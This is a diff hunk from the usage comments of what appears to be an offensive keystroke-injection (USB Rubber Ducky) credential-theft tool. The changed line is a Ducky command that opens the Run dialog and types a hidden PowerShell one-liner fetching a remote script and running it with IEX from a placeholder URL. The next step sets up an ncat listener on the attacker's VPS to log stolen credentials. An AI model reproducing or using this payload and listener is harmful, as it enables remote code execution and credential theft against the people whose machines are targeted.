@@ -10,7 +10,7 @@ https://gist.githubusercontent.com/attacker/xxxxxxxxxxxxxx/raw/xxxxxxxxxxxxxx/lo
 4) Add it to the Ducky script
 		Delay
 		Press:131+114
-		PrintLine:powershell -W Hidden -nop -noni -c "IEX (New-Object Net.Webclient).downloadstring('https://goo.gl/XXXXX')"
+		PrintLine:powershell -nop -noni -w 1 -c "IEX (New-Object Net.Webclient).downloadstring('https://goo.gl/XXXXX')"
 5) On the Attacker's VPS use the following cmd to listen for incoming creds:
 	ncat -k -l -p 80 | tee creds.log
 #>
